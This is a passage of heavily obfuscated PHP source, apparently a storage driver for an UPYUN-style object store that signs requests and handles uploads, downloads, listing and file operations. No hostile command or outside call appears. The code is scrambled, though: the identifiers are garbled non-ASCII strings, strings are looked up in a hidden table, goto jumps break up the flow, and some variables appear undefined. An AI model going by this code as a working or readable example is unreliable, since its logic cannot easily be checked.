(empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[“][1228], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($DœÃŒ•„¦, $B´ğ‚ÕˆñÀ = "\107\x45\x54") { $eíİ“«„¬ =& $_SERVER[“]; $Aõ‰Ú°££ = gmdate($eíİ“«„¬[1192]); $a±ƒ¼ÃºÔ = base64_encode(hash_hmac($eíİ“«„¬[1229], "{$B´ğ‚ÕˆñÀ}\x26{$DœÃŒ•„¦}\x26{$Aõ‰Ú°££}", md5("{$this->userpass}"), !0)); $Bß‰Á¥åÛ¸ = array("\x41\165\164\x68\x6f\162\x69\172\141\164\x69\157\x6e\72\125\x50\131\x55\x4e\x20{$this->username}\72{$a±ƒ¼ÃºÔ}", "\104\x61\x74\x65\72{$Aõ‰Ú°££}"); return $Bß‰Á¥åÛ¸; } public function ussRequest($f†ØçÁì„¸, $B†‹‡•ˆ° = "\x47\x45\x54", $B»¸±šÛ÷Á = false, $F•Îê²ó®ã = false, $fŠ±ğÁ—â· = false) { goto AÆ£˜¨¨ä¦; eİßñ§ŠíÈ: $c¨ô¦´Õ± = $this->ussHeaders($CëçãœÁÏÊ, $B†‹‡•ˆ°); if ($F•Îê²ó®ã) { $c¨ô¦´Õ± = array_merge($c¨ô¦´Õ±, $F•Îê²ó®ã); } $dŠÛ®Ò¶Ø = url_request($this->endpoint . $CëçãœÁÏÊ, $B†‹‡•ˆ°, $B»¸±šÛ÷Á, $c¨ô¦´Õ±, $fŠ±ğÁ—â·); goto eôàÈ”ƒ²Ş; AÆ£˜¨¨ä¦: $a¥Ù¥¤İ©ø =& $_SERVER[“]; $f†ØçÁì„¸ = trim($f†ØçÁì„¸, $a¥Ù¥¤İ©ø[8]); $CëçãœÁÏÊ = "\57{$this->bucket}\x2f{$f†ØçÁì„¸}"; goto eİßñ§ŠíÈ; eôàÈ”ƒ²Ş: if (!$dŠÛ®Ò¶Ø) { return array($a¥Ù¥¤İ©ø[1019] => !1, $a¥Ù¥¤İ©ø[1021] => $a¥Ù¥¤İ©ø[1230]); } if (strtolower($B†‹‡•ˆ°) == $a¥Ù¥¤İ©ø[184] || in_array($dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[1019]], array($a¥Ù¥¤İ©ø[1087], $a¥Ù¥¤İ©ø[1231]))) { $B»¸±šÛ÷Á = $dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[1232]]; } else { $B»¸±šÛ÷Á = json_decode($dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[1021]], !0); if (!$B»¸±šÛ÷Á) { $B»¸±šÛ÷Á = $dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[1021]]; } else { if (!$dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[673]] && isset($B»¸±šÛ÷Á[$a¥Ù¥¤İ©ø[1233]])) { $B»¸±šÛ÷Á = $B»¸±šÛ÷Á[$a¥Ù¥¤İ©ø[1233]]; } } } return array($a¥Ù¥¤İ©ø[1019] => $dŠÛ®Ò¶Ø[$a¥Ù¥¤İ©ø[673]], $a¥Ù¥¤İ©ø[1021] => $B»¸±šÛ÷Á); goto f¹ÅÂø‹Å; f¹ÅÂø‹Å: } public function mkfile($fÈã¿´À, $e¹æñ„ê ³ = '', $A±¨ŞÉ„¾Ñ = REPEAT_RENAME) { if ($this->setContent($fÈã¿´À, $e¹æñ„ê ³)) { return $this->getPathOuter($fÈã¿´À); } return !1; } public function mkdir($d„ùï‰œ¦ö, $B‡³çáÊÃ« = REPEAT_SKIP) { $eë£‚†™ó¯ =& $_SERVER[“]; $bğŠÚœ¥¤ = trim($d„ùï‰œ¦ö, $eë£‚†™ó¯[8]); if ($this->_isFolder($bğŠÚœ¥¤)) { return $this->getPathOuter($bğŠÚœ¥¤); } $Cçõö¸ã‰ = array($eë£‚†™ó¯[1234]); $f¦Å¨‰¬›‘ = $this->ussRequest($bğŠÚœ¥¤, $eë£‚†™ó¯[212], !1, $Cçõö¸ã‰); return $f¦Å¨‰¬›‘[$eë£‚†™ó¯[1019]] ? $this->getPathOuter($bğŠÚœ¥¤) : !1; } public function copyFile($b‹ßÙ–‹í, $b ã×»æ©Õ) { $a” ‡àÖã =& $_SERVER[“]; $DíòŒĞÆÇï = array($a” ‡àÖã[1235] . "\x2f{$this->bucket}\x2f{$b‹ßÙ–‹í}", $a” ‡àÖã[1236]); $d¶ÀÁò‚¦¿ = $this->ussRequest($b ã×»æ©Õ, $a” ‡àÖã[214], !1, $DíòŒĞÆÇï); return $d¶ÀÁò‚¦¿[$a” ‡àÖã[1019]] ? !0 : $this->getPathOuter($b ã×»æ©Õ); } public function moveFile($B•£—Æ„²•, $fòÃÇÌ‡‡) { $e‰åèñÅÇô =& $_SERVER[“]; $cÜ­Ïâ­Òï = array($e‰åèñÅÇô[1237] . "\x2f{$this->bucket}\57{$B•£—Æ„²•}", $e‰åèñÅÇô[1236]); $C›œ¹µµ¨À = $this->ussRequest($fòÃÇÌ‡‡, $e‰åèñÅÇô[214], !1, $cÜ­Ïâ­Òï); return $C›œ¹µµ¨À[$e‰åèñÅÇô[1019]] ? !0 : $this->getPathOuter($fòÃÇÌ‡‡); } public function delFile($BË‰ùàÚ¦Î) { $dÛ×«ôÎĞµ =& $_SERVER[“]; $bŸ”‘†Ôìò = $this->ussRequest($BË‰ùàÚ¦Î, $dÛ×«ôÎĞµ[1238]); return $bŸ”‘†Ôìò[$dÛ×«ôÎĞµ[1019]] ? !0 : !1; } public function delFolder($B¡Î§ãÉêÆ) { $fí©âõğò =& $_SERVER[“]; $cÖË¨’ŠÀ¯ = $this->listAll($B¡Î§ãÉêÆ); krsort($cÖË¨’ŠÀ¯); foreach ($cÖË¨’ŠÀ¯ as $dÊ—…”º˜©) { $this->ussRequest($dÊ—…”º˜©[$fí©âõğò[75]], $fí©âõğò[1238]); } return $this->ussRequest($B¡Î§ãÉêÆ, $fí©âõğò[1238]); } public function rename($b¸¹§«…Îø, $d„ˆÍËæŞ¤) { if ($this->isFile($b¸¹§«…Îø)) { $d„ˆÍËæŞ¤ = get_path_father($b¸¹§«…Îø) . $d„ˆÍËæŞ¤; return $this->moveFile($b¸¹§«…Îø, $d„ˆÍËæŞ¤); } return $this->renameObject($b¸¹§«…Îø, $d„ˆÍËæŞ¤); } public function fileInfo($dšÓ„¾ëâ“, $d™Óƒ¯‰¸ = false, $D‡ïĞ“¨ó = array()) { $Cèµ×¯¤’ =& $_SERVER[“]; if ($d™Óƒ¯‰¸) { return array($Cèµ×¯¤’[28] => $this->pathThis($dšÓ„¾ëâ“), $Cèµ×¯¤’[75] => $this->getPathOuter($Cèµ×¯¤’[8] . $dšÓ„¾ëâ“), $Cèµ×¯¤’[29] => $Cèµ×¯¤’[167], $Cèµ×¯¤’[77] => isset($D‡ïĞ“¨ó[$Cèµ×¯¤’[325]]) ? $D‡ïĞ“¨ó[$Cèµ×¯¤’[325]] : 0, $Cèµ×¯¤’[160] => $this->ext($dšÓ„¾ëâ“)); } $a…Œá¿²«Ë = array($Cèµ×¯¤’[28] => $this->pathThis($dšÓ„¾ëâ“), $Cèµ×¯¤’[75] => $this->getPathOuter($Cèµ×¯¤’[8] . $dšÓ„¾ëâ“), $Cèµ×¯¤’[29] => $Cèµ×¯¤’[167], $Cèµ×¯¤’[187] => 0, $Cèµ×¯¤’[107] => isset($bø¼•º’›ã[$Cèµ×¯¤’[1239]]) ? $bø¼•º’›ã[$Cèµ×¯¤’[1239]] : 0, $Cèµ×¯¤’[77] => isset($D‡ïĞ“¨ó[$Cèµ×¯¤’[325]]) ? $D‡ïĞ“¨ó[$Cèµ×¯¤’[325]] : 0, $Cèµ×¯¤’[160] => $this->ext($dšÓ„¾ëâ“), $Cèµ×¯¤’[188] => !0, $Cèµ×¯¤’[189] => !0); if (empty($D‡ïĞ“¨ó)) { $D‡ïĞ“¨ó = $this->objectMeta($dšÓ„¾ëâ“); if (!$D‡ïĞ“¨ó) { return $a…Œá¿²«Ë; } $a…Œá¿²«Ë[$Cèµ×¯¤’[187]] = $D‡ïĞ“¨ó[$Cèµ×¯¤’[1240]]; $a…Œá¿²«Ë[$Cèµ×¯¤’[107]] = $D‡ïĞ“¨ó[$Cèµ×¯¤’[1241]]; $a…Œá¿²«Ë[$Cèµ×¯¤’[77]] = $D‡ïĞ“¨ó[$Cèµ×¯¤’[77]]; } return $a…Œá¿²«Ë; } public function folderInfo($EŞ™­©§, $EÍ¯¹ßÉŞË = false) { $aÓ‡ê£——¬ =& $_SERVER[“]; if ($EÍ¯¹ßÉŞË) { return array($aÓ‡ê£——¬[28] => $this->pathThis($EŞ™­©§), $aÓ‡ê£——¬[75] => $this->getPathOuter($aÓ‡ê£——¬[8] . $EŞ™­©§), $aÓ‡ê£——¬[29] => $aÓ‡ê£——¬[76]); } $cïê ÙÏÈ = array($aÓ‡ê£——¬[28] => $this->pathThis($EŞ™­©§), $aÓ‡ê£——¬[75] => $this->getPathOuter($aÓ‡ê£——¬[8] . $EŞ™­©§), $aÓ‡ê£——¬[29] => $aÓ‡ê£——¬[76], $aÓ‡ê£——¬[187] => 0, $aÓ‡ê£——¬[107] => isset($c¸êÃöê¯¬[$aÓ‡ê£——¬[1239]]) ? $c¸êÃöê¯¬[$aÓ‡ê£——¬[1239]] : 0, $aÓ‡ê£——¬[1149] => !0, $aÓ‡ê£——¬[1150] => !0); if (empty($Eƒ¡°´³ª)) { $Eƒ¡°´³ª = $this->objectMeta($EŞ™­©§); if (!$Eƒ¡°´³ª) { return $cïê ÙÏÈ; } $cïê ÙÏÈ[$aÓ‡ê£——¬[187]] = $Eƒ¡°´³ª[$aÓ‡ê£——¬[1240]]; $cïê ÙÏÈ[$aÓ‡ê£——¬[107]] = $Eƒ¡°´³ª[$aÓ‡ê£——¬[1241]]; } return $cïê ÙÏÈ; } private function fileList($D¹Şäâšõ, $D„ö‰÷£  = 0, $eÅÜÆ¯«Û† = 1000) { $fÚôİ‘Åæã =& $_SERVER[“]; $E•¿ˆÔ¼œğ = array($fÚôİ‘Åæã[1242], $fÚôİ‘Åæã[1243] . $eÅÜÆ¯«Û†); if ($D„ö‰÷£ ) { $E•¿ˆÔ¼œğ[] = $fÚôİ‘Åæã[1244] . $D„ö‰÷£ ; } $eÄÇÆ•»ÁÚ = $this->ussRequest($D¹Şäâšõ, $fÚôİ‘Åæã[216], !1, $E•¿ˆÔ¼œğ); return !$eÄÇÆ•»ÁÚ[$fÚôİ‘Åæã[1019]] ? !1 : $eÄÇÆ•»ÁÚ[$fÚôİ‘Åæã[1021]]; } public function listPath($e‡âÑ¼’å, $b´…™Çø = false) { goto eÇÊÙê÷ùÈ; F¶…§¶È¼¥: $aæ°“õÃ = $fğÃÕÖ± = array(); $f˜Œ£‡‰´ = rtrim($e‡âÑ¼’å, $fæâ§‚åŒ‘[8]) . $fæâ§‚åŒ‘[8]; while (!0) { $D°õ…£¸ = $this->fileList($e‡âÑ¼’å, $D’Ğò§—ø´, $Cæâ±‚£Ä×); if (!$D°õ…£¸) { return !1; } $D’Ğò§—ø´ = isset($D°õ…£¸[$fæâ§‚åŒ‘[1245]]) ? $D°õ…£¸[$fæâ§‚åŒ‘[1245]] : $fæâ§‚åŒ‘[33]; $D¿¢¡õè í = isset($D°õ…£¸[$fæâ§‚åŒ‘[1246]]) ? $D°õ…£¸[$fæâ§‚åŒ‘[1246]] : array(); foreach ($D¿¢¡õè í as $BÍõİ†ğØ) { if ($BÍõİ†ğØ[$fæâ§‚åŒ‘[29]] == $fæâ§‚åŒ‘[76]) { $aæ°“õÃ[] = $this->folderInfo($f˜Œ£‡‰´ . $BÍõİ†ğØ[$fæâ§‚åŒ‘[28]], $b´…™Çø, $BÍõİ†ğØ); } else { $fğÃÕÖ±[] = $this->fileInfo($f˜Œ£‡‰´ . $BÍõİ†ğØ[$fæâ§‚åŒ‘[28]], $b´…™Çø, $BÍõİ†ğØ); } } if (count($D¿¢¡õè í) < $Cæâ±‚£Ä×) { break; } } goto aæÖ¡íºÕò; aæÖ¡íºÕò: return array($fæâ§‚åŒ‘[74] => $aæ°“õÃ, $fæâ§‚åŒ‘[73] => $fğÃÕÖ±); goto F¨åÒÒ…Á…; eÇÊÙê÷ùÈ: $fæâ§‚åŒ‘ =& $_SERVER[“]; $D’Ğò§—ø´ = $fæâ§‚åŒ‘[33]; $Cæâ±‚£Ä× = 1000; goto F¶…§¶È¼¥; F¨åÒÒ…Á…: } private function recursionAllFiles($E—‹´¥Š¯Î, &$Bø—óÀùÄœ) { $f‰“’İÃÆ§ =& $_SERVER[“]; $B‡ïÖ‹ß–à = $f‰“’İÃÆ§[33]; $d·ëİ¹ğÑ = 1000; $b¡ä‚øÛò = $B·¿»‹é„ = array(); $bÈÁ¨İ¶¿Õ = rtrim($E—‹´¥Š¯Î, $f‰“’İÃÆ§[8]) . $f‰“’İÃÆ§[8]; while (!0) { $fÊº°šßÓÃ = $this->fileList($E—‹´¥Š¯Î, $B‡ïÖ‹ß–à, $d·ëİ¹ğÑ); if (!$fÊº°šßÓÃ) { return !1; } $B‡ïÖ‹ß–à = isset($fÊº°šßÓÃ[$f‰“’İÃÆ§[1245]]) ? $fÊº°šßÓÃ[$f‰“’İÃÆ§[1245]] : $f‰“’İÃÆ§[33]; $A·š¥„ƒ„Ç = isset($fÊº°šßÓÃ[$f‰“’İÃÆ§[1246]]) ? $fÊº°šßÓÃ[$f‰“’İÃÆ§[1246]] : array(); foreach ($A·š¥„ƒ„Ç as $bÅ¹Ô”ÎÜá) { $dÒÎ®ÃÕ´– = array($f‰“’İÃÆ§[75] => $bÈÁ¨İ¶¿Õ . $bÅ¹Ô”ÎÜá[$f‰“’İÃÆ§[28]], $f‰“’İÃÆ§[76] => $bÅ¹Ô”ÎÜá[$f‰“’İÃÆ§[29]] == $f‰“’İÃÆ§[76] ? 1 : 0, $f‰“’İÃÆ§[77] => isset($bÅ¹Ô”ÎÜá[$f‰“’İÃÆ§[325]]) ? $bÅ¹Ô”ÎÜá[$f‰“’İÃÆ§[325]] : 0); $Bø—óÀùÄœ[] = $dÒÎ®ÃÕ´–; if ($dÒÎ®ÃÕ´–[$f‰“’İÃÆ§[76]] == 1) { $this->recursionAllFiles($dÒÎ®ÃÕ´–[$f‰“’İÃÆ§[75]], $Bø—óÀùÄœ); } } if (count($A·š¥„ƒ„Ç) < $d·ëİ¹ğÑ) { break; } } } public function has($cµæÙ´ƒÖ, $b‘¤ßÛËõ = false, $f²…«®òË„ = true) { goto DĞõ™Ş’•“; f™‡é“¬áâ: while (!0) { $EêØ¨ÃŠÆ = $this->fileList($cµæÙ´ƒÖ, $dí×ŞÔ’‹Ì, $fÉÖæèÆç); if (!$EêØ¨ÃŠÆ) { return !1; } $dí×ŞÔ’‹Ì = isset($EêØ¨ÃŠÆ[$b„ñçº¤¦[1245]]) ? $EêØ¨ÃŠÆ[$b„ñçº¤¦[1245]] : $b„ñçº¤¦[33]; $Bİó™ƒËéå = isset($EêØ¨ÃŠÆ[$b„ñçº¤¦[1246]]) ? $EêØ¨ÃŠÆ[$b„ñçº¤¦[1246]] : array(); if (empty($Bİó™ƒËéå)) { break; } $C”ö¨Òù» = array_to_keyvalue($Bİó™ƒËéå, $b„ñçº¤¦[33], $b„ñçº¤¦[29]); $fÄ–˜„õÏÎ = array_count_values($C”ö¨Òù»); $bÍÆé››Ãê = isset($fÄ–˜„õÏÎ[$b„ñçº¤¦[76]]) ? $fÄ–˜„õÏÎ[$b„ñçº¤¦[76]] : 0; $dÆéë¹òÂ² = count($C”ö¨Òù») - $bÍÆé››Ãê; if ($b‘¤ßÛËõ) { $A·˜¡ÃØË‚ += $bÍÆé››Ãê; $aÈ½Á–ê„á += $dÆéë¹òÂ²; if ($EÃ¿ã¿‘†í < $fÉÖæèÆç) { break; } continue; } if ($f²…«®òË„) { if ($dÆéë¹òÂ²) { return !0; } } else { if ($bÍÆé››Ãê) { return !0; } } if (count($Bİó™ƒËéå) < $fÉÖæèÆç) { break; } } if ($b‘¤ßÛËõ) { return array($b„ñçº¤¦[191] => $aÈ½Á–ê„á, $b„ñçº¤¦[192] => $A·˜¡ÃØË‚); } return !1; goto CìÈêÛ¼¼£; BÁÛò‚¯‚: $aÈ½Á–ê„á = 0; $A·˜¡ÃØË‚ = 0; $eÆ±Œ„åç = rtrim($cµæÙ´ƒÖ, $b„ñçº¤¦[8]) . $b„ñçº¤¦[8]; goto f™‡é“¬áâ; DĞõ™Ş’•“: $b„ñçº¤¦ =& $_SERVER[“]; $dí×ŞÔ’‹Ì = $b„ñçº¤¦[33]; $fÉÖæèÆç = 1000; goto BÁÛò‚¯‚; CìÈêÛ¼¼£: } public function listAll($C®ñĞ˜øŞ¨) { $CìÒ‘´•† = array(); $this->recursionAllFiles($C®ñĞ˜øŞ¨, $CìÒ‘´•†); return $CìÒ‘´•†; } public function canRead($aÜˆöáî‹Ÿ) { return $this->exist($aÜˆöáî‹Ÿ) ? !0 : !1; } public function canWrite($aà®ªèö¼) { return $this->exist($aà®ªèö¼) ? !0 : !1; } public function getContent($B­èŸ™‘™) { return $this->fileSubstr($B­èŸ™‘™, 0, -1); } public function setContent($EÅÉà±©öå, $Dàõ‡ñ¹à = '') { $aò±«ğ’ì =& $_SERVER[“]; if (!$Dàõ‡ñ¹à) { $EïŞ…´ ¬ô = $this->ussRequest($EÅÉà±©öå, $aò±«ğ’ì[212]); return $EïŞ…´ ¬ô[$aò±«ğ’ì[1019]]; } $aÜéØËí† = $this->tempFile($this->pathThis($EÅÉà±©öå)); file_put_contents($aÜéØËí†, $Dàõ‡ñ¹à); if ($this->upload($EÅÉà±©öå, $aÜéØËí†)) { $this->tempFileRemve($aÜéØËí†); return !0; } return !1; } public function fileSubstr($fÒŠÊ§â¥ö, $AÛ©¥¢°‰â, $d¬÷”™ÁÒŒ) { $f¢øÕ­èâ =& $_SERVER[“]; if (!($AÇ‹¡Ú©ì¬ = $this->link($fÒŠÊ§â¥ö))) { return !1; } $a¦ªè¿Ó¼ = !1; if ($d¬÷”™ÁÒŒ > 0) { $aà÷È«–ƒ = $AÛ©¥¢°‰â + $d¬÷”™ÁÒŒ - 1; $a¦ªè¿Ó¼ = array($f¢øÕ­èâ[1207] . $AÛ©¥¢°‰â . $f¢øÕ­èâ[412] . $aà÷È«–ƒ); } $Få¥ëööªÅ = url_request($AÇ‹¡Ú©ì¬, $f¢øÕ­èâ[216], !1, $a¦ªè¿Ó¼); return $Få¥ëööªÅ[$f¢øÕ­èâ[673]] ? $Få¥ëööªÅ[$f¢øÕ­èâ[1021]] : !1; } public function upload($d§‘ïï¾÷‚, $CÖ‹åĞ–§¦, $aÉ‰«‹Æöà = false, $Fé¶¨šÔ°Œ = REPEAT_REPLACE) { goto c¾°¤„ÁæÅ; fŒæ‡¸Ê: do { $aÈÓÊçêŞ = $Cï‡â³Ö­¼[$aÂšíØğÎ[1253]]; fseek($B·ÏÏÉ¸ÍÚ, $B¼ùˆ¦îÒˆ); $E¾ÑÌÜŞä‰ = fread($B·ÏÏÉ¸ÍÚ, $aÈÓÊçêŞ); $FÒÑŞ—¬°Ú = 0; do { $FÒÑŞ—¬°Ú++; $Cï‡â³Ö­¼ = $this->uploadPart($d§‘ïï¾÷‚, $Cï‡â³Ö­¼, $E¾ÑÌÜŞä‰); } while (!$Cï‡â³Ö­¼ && $FÒÑŞ—¬°Ú < 3); if (!$Cï‡â³Ö­¼) { return !1; } $d­¨À•¹Ò— = $Cï‡â³Ö­¼[$aÂšíØğÎ[1252]]; $B¼ùˆ¦îÒˆ += $aÈÓÊçêŞ; } while ($d­¨À•¹Ò— != -1); fclose($B·ÏÏÉ¸ÍÚ); $eé¥Ñïåáö = array($aÂšíØğÎ[1254], $aÂšíØğÎ[1255] . $Cï‡â³Ö­¼[$aÂšíØğÎ[1256]], $aÂšíØğÎ[1250]); goto Dº¸ƒ±Š‡ò; Dº¸ƒ±Š‡ò: $E´Œ­¬Şº = $this->ussRequest($d§‘ïï¾÷‚, $aÂšíØğÎ[214], !1, $eé¥Ñïåáö); return $E´Œ­¬Şº[$aÂšíØğÎ[1019]] ? $this->getPathOuter($aäÖóêºŞğ) : !1; goto f¼µ ßíŒ…; C‹©õñÛÏ¥: $d­¨À•¹Ò— = $Cï‡â³Ö­¼[$aÂšíØğÎ[1252]]; $B·ÏÏÉ¸ÍÚ = fopen($CÖ‹åĞ–§¦, $aÂšíØğÎ[1157]); if (!$B·ÏÏÉ¸ÍÚ) { return !1; } goto fŒæ‡¸Ê; dÖñçùÊ–ã: if (!$E´Œ­¬Şº[$aÂšíØğÎ[1019]]) { return !1; } $Cï‡â³Ö­¼ = $E´Œ­¬Şº[$aÂšíØğÎ[1021]]; $B¼ùˆ¦îÒˆ = 0; goto C‹©õñÛÏ¥; c¾°¤„ÁæÅ: $aÂšíØğÎ =& $_SERVER[“]; $BÀÀ±Ù£†¯ = IO::size($CÖ‹åĞ–§¦); if ($BÀÀ±Ù£†¯ <= 1024 * 1024 * 200) { $AìÃ×÷ã†© = array($aÂšíØğÎ[1247] . $CÖ‹åĞ–§¦); $E´Œ­¬Şº = $this->ussRequest($d§‘ïï¾÷‚, $aÂšíØğÎ[214], $AìÃ×÷ã†©); return $E´Œ­¬Şº[$aÂšíØğÎ[1019]] ? $this->getPathOuter($d§‘ïï¾÷‚) : !1; } goto dÕ™¿‚…éÜ; dÕ™¿‚…éÜ: $dÂß´™º± = 1024 * 1024 * 10; $eé¥Ñïåáö = array($aÂšíØğÎ[1248], $aÂšíØğÎ[1249] . $BÀÀ±Ù£†¯, $aÂšíØğÎ[1250], $aÂšíØğÎ[1251] . $dÂß´™º±); $E´Œ­¬Şº = $this->ussRequest($d§‘ïï¾÷‚, $aÂšíØğÎ[214], !1, $eé¥Ñïåáö); goto dÖñçùÊ–ã; f¼µ ßíŒ…: } private function uploadPart($A¼¶¤Ô÷›, $A–ÂÌ­¸ÛÔ, &$e‰µ¼Òèä©) { $Dòä—ÙÒ¨­ =& $_SERVER[“]; $EØÏ‘”Ä×Ö = array($Dòä—ÙÒ¨­[1257], $Dòä—ÙÒ¨­[1255] . $A–ÂÌ­¸ÛÔ[$Dòä—ÙÒ¨­[1256]], $Dòä—ÙÒ¨­[1258] . $A–ÂÌ­¸ÛÔ[$Dòä—ÙÒ¨­[1252]], $Dòä—ÙÒ¨­[138] . $A–ÂÌ­¸ÛÔ[$Dòä—ÙÒ¨­[1253]]); $fÈóäŒßÙ¸ = $this->ussRequest($A¼¶¤Ô÷›, $Dòä—ÙÒ¨­[214], $e‰µ¼Òèä©, $EØÏ‘”Ä×Ö); return !$fÈóäŒßÙ¸[$Dòä—ÙÒ¨­[1019]] ? $fÈóäŒßÙ¸[$Dòä—ÙÒ¨­[1019]] : $fÈóäŒßÙ¸[$Dòä—ÙÒ¨­[1021]]; } public function uploadFormData($EÅÎµÆ‚Â, $b­öÇÎµ¹ = 3600) { return $this->uploadPolicy($EÅÎµÆ‚Â, $b­öÇÎµ¹); } public function multiUploadFormData($a÷ƒÔĞ‚, $b¶»¼¤Õñ = 3600) { $dŠÄ·îøªÁ =& $_SERVER[“]; $d¸·¾“ÎË = (int) $GLOBALS[$dŠÄ·îøªÁ[7]][$dŠÄ·îøªÁ[77]]; return $this->uploadPolicy($a÷ƒÔĞ‚, $b¶»¼¤Õñ, $d¸·¾“ÎË); } private function uploadPolicy($DóÊÑçÆÂÁ, $a‘ê¸Ö¹Ù = 3600, $A¸Øò´Ë­Ê = 0) { goto bÙÇ‚œ‡—; B±™¿øÅ : $b°†ÕØ—Ó = base64_encode(hash_hmac($fÎ‘»ÃòŠ¬[1229], "\120\117\123\x54\46{$b´é¤óÁÃ}\46{$f“¾øÅÚÎ‘}\x26{$aØ†¶—¦¬¡}", md5("{$this->userpass}"), !0)); $Cï¶å¡ ‰­ = array($fÎ‘»ÃòŠ¬[1099] => $aØ†¶—¦¬¡, $fÎ‘»ÃòŠ¬[1263] => "\125\x50\131\125\x4e\40{$this->username}\72{$b°†ÕØ—Ó}", $fÎ‘»ÃòŠ¬[169] => $this->endpoint . $b´é¤óÁÃ); return $Cï¶å¡ ‰­; goto DğÆÑïŒ¤; bÙÇ‚œ‡—: $fÎ‘»ÃòŠ¬ =& $_SERVER[“]; $b´é¤óÁÃ = $fÎ‘»ÃòŠ¬[8] . $this->bucket; $f“¾øÅÚÎ‘ = gmdate($fÎ‘»ÃòŠ¬[1192]); goto aÈé…«È±; aÈé…«È±: $fé¦ò¬¶·³ = array($fÎ‘»ÃòŠ¬[1259] => $this->bucket, $fÎ‘»ÃòŠ¬[1260] => $DóÊÑçÆÂÁ, $fÎ‘»ÃòŠ¬[1261] => time() + $a‘ê¸Ö¹Ù, $fÎ‘»ÃòŠ¬[1262] => $f“¾øÅÚÎ‘); if ($A¸Øò´Ë­Ê) { $fé¦ò¬¶·³[$fÎ‘»ÃòŠ¬[1178]] = $A¸Øò´Ë­Ê; } $aØ†¶—¦¬¡ = base64_encode(json_encode($fé¦ò¬¶·³)); goto B±™¿øÅ ; DğÆÑïŒ¤: } public function download($E½ñÜ ±ì›, $dğ‹ŒÉáµ ) { goto Cîî×Õ¦¤†; a›²‹Şì›·: $AñÃŠø“ŒØ = 1024 * 200; $FóÁ„áÍÅõ = fopen($E§°¼³ÆÒ, $_SERVER[“][1213]); while (!0) { $b±Ë¼·­’“ = $this->fileSubstr($E½ñÜ ±ì›, $fóÏã‡ù”Ç, $AñÃŠø“ŒØ); if ($b±Ë¼·­’“ === !1) { return !1; } fwrite($FóÁ„áÍÅõ, $b±Ë¼·­’“); $fóÏã‡ù”Ç += $AñÃŠø“ŒØ; if (strlen($b±Ë¼·­’“) < $AñÃŠø“ŒØ) { break; } } goto a„½Øã•Ø; a„½Øã•Ø: fclose($FóÁ„áÍÅõ); return $dğ‹ŒÉáµ ; goto CÕğÓ™ñÄ¤; Cîî×Õ¦¤†: $E§°¼³ÆÒ = IO::getPathInner(IO::mkfile($dğ‹ŒÉáµ )); if (!($Eî˜’¶¥¼ = $this->link($E½ñÜ ±ì›))) { return !1; } $fóÏã‡ù”Ç = 0; goto a›²‹Şì›·; CÕğÓ™ñÄ¤: } public function link($bŸ†˜İæÛË, $C£ÆÂŸŒî = array()) { $BÓ‡ÚÛÜ¤ =& $_SERVER[“]; $bŸ†˜İæÛË = trim($bŸ†˜İæÛË, $BÓ‡ÚÛÜ¤[8]); if (!empty($this->token)) { $då¯àô÷´Û = strtotime(date($BÓ‡ÚÛÜ¤[1264])); $C²ÜŒÊ°³– = substr(md5($this->token . $BÓ‡ÚÛÜ¤[272] . $då¯àô÷´Û . $BÓ‡ÚÛÜ¤[1265] . $bŸ†˜İæÛË), 12, 8) . $då¯àô÷´Û; $C£ÆÂŸŒî[] = $BÓ‡ÚÛÜ¤[1266] . $C²ÜŒÊ°³–; } $e´ÆÚ’È´ = !empty($C£ÆÂŸŒî) ? $BÓ‡ÚÛÜ¤[69] . implode($BÓ‡ÚÛÜ¤[272], $C£ÆÂŸŒî) : $BÓ‡ÚÛÜ¤[33]; return $this->getHost() . $BÓ‡ÚÛÜ¤[8] . $bŸ†˜İæÛË . $e´ÆÚ’È´; } public function fileOut($Bœ…Ş«£¹İ, $EÂ¸Ç„ëŒ = false, $eÕÕ¸¢¢Ğˆ = false, $A˜¹Ú©ù–Ï = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Bœ…Ş«£¹İ, $EÂ¸Ç„ëŒ, $eÕÕ¸¢¢Ğˆ, $A˜¹Ú©ù–Ï); } if (!$eÕÕ¸¢¢Ğˆ) { $eÕÕ¸¢¢Ğˆ = $this->pathThis($Bœ…Ş«£¹İ); } $C¨•‹…ğµ• = $EÂ¸Ç„ëŒ ? array($_SERVER[“][1267] . rawurlencode($eÕÕ¸¢¢Ğˆ)) : array(); $a¤„‚Æ˜« = $this->link($Bœ…Ş«£¹İ, $C¨•‹…ğµ•); $this->fileOutLink($a¤„‚Æ˜«); } public function fileOutServer($cÃØ£‰ÉÄÇ, $dåâ‚‹‰»• = false, $DáºˆæÀ·¦ = false, $EÄ›Ãâ•¬“ = '') { parent::fileOut($cÃØ£‰ÉÄÇ, $dåâ‚‹‰»•, $DáºˆæÀ·¦, $EÄ›Ãâ•¬“); } public function fileOutImage($A±·‹ôâš , $bóèğëä = 250) { $Eˆ¡²¶‘ = $this->link($A±·‹ôâš  . $_SERVER[“][1268] . $bóèğëä); $this->fileOutLink($Eˆ¡²¶‘); } public function fileOutImageServer($dÅÁ¼±·ã, $e±ß´Ìçà“ = 250) { parent::fileOutImage($dÅÁ¼±·ã, $e±ß´Ìçà“); } public function hashMd5($D½ÄåÄÍ¨ô) { $B‰œæÎ–Ì¥ =& $_SERVER[“]; $f‹êÍğ‚©ó = $this->objectMeta($D½ÄåÄÍ¨ô); return isset($f‹êÍğ‚©ó[$B‰œæÎ–Ì¥[196]]) ? $f‹êÍğ‚©ó[$B‰œæÎ–Ì¥[196]] : !1; } public function size($AËì¸‰ ­Í) { $A‡¡ëÆ’¯ì = $this->objectMeta($AËì¸‰ ­Í); return $A‡¡ëÆ’¯ì ? $A‡¡ëÆ’¯ì[$_SERVER[“][77]] : 0; } public function info($f³¼ìœÑä°) { if ($this->isFolder($f³¼ìœÑä°)) { return $this->folderInfo($f³¼ìœÑä°); } else { if ($this->isFile($f³¼ìœÑä°)) { return $this->fileInfo($f³¼ìœÑä°); } } return !1; } public function exist($d¶×ÁĞäÍ) { return $this->isFile($d¶×ÁĞäÍ) || $this->isFolder($d¶×ÁĞäÍ); } public function isFile($aÎ«Ïğö) { return !$this->isFolder($aÎ«Ïğö) && 